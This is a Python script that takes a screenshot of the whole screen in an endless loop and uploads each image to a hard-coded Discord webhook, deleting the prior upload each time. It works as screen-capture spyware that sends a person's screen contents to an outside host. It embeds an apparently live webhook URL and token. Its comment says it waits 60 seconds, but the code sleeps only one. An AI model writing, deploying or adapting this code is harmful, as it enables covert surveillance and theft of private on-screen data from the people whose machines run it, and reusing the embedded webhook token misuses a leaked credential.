import os
import time
import requests
from PIL import ImageGrab

# Discord Webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1330674445865586728/W2BI-bA25yoVHs0XTclaneW7mXtp-Dhhw_eB8sHQDtw8fCzvVm88riYSkJ14etboAaBE"

# Path for storing the screenshot
screenshot_path = "screenshot.png"

# Global variable to store the message ID of the last screenshot
last_message_id = None

def capture_screenshot(save_path):
    """Capture a screenshot and save it to the specified path."""
    screenshot = ImageGrab.grab()
    screenshot.save(save_path, "PNG")
    print(f"Screenshot saved at {save_path}.")

def send_to_discord(file_path, webhook_url):
    """Send the screenshot file to Discord using a webhook."""
    global last_message_id

    # Delete the previous message if it exists
    if last_message_id:
        delete_discord_message(webhook_url, last_message_id)

    # Send the new screenshot
    with open(file_path, "rb") as file:
        payload = {
            "content": "Here is the latest screenshot."
        }
        files = {
            "file": file
        }
        response = requests.post(webhook_url, data=payload, files=files)

    if response.status_code == 200 or response.status_code == 204:
        # Save the message ID for the new screenshot
        last_message_id = response.json()["id"]
        print("Screenshot sent to Discord successfully.")
    else:
        print(f"Failed to send screenshot to Discord: {response.status_code} - {response.text}")

def delete_discord_message(webhook_url, message_id):
    """Delete a message on Discord using its ID."""
    delete_url = f"{webhook_url}/messages/{message_id}"
    response = requests.delete(delete_url)

    if response.status_code == 204:
        print(f"Deleted previous screenshot message: {message_id}")
    else:
        print(f"Failed to delete previous message: {response.status_code} - {response.text}")

def main():
    while True:
        # Capture a new screenshot
        capture_screenshot(screenshot_path)
        
        # Send the screenshot to Discord
        send_to_discord(screenshot_path, DISCORD_WEBHOOK_URL)
        
        # Wait before capturing the next screenshot
        print("Waiting for 60 seconds before taking the next screenshot...")
        time.sleep(1)

if __name__ == "__main__":
    main()
